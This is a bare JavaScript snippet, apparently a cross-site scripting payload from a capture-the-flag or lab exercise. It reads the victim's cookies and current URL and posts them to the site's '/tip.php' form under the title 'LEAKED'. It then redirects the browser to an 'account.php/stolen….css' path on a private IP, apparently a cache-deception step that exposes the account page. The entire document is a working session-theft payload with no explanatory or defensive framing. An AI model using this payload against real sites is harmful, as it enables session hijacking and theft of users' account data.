fetch("/tip.php", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "title=LEAKED&body=" + encodeURIComponent(document.cookie + " | " + document.location.href) + "&link=http://x/&intake="
});
window.location = "http://172.28.3.2/account.php/stolen" + Date.now() + ".css";
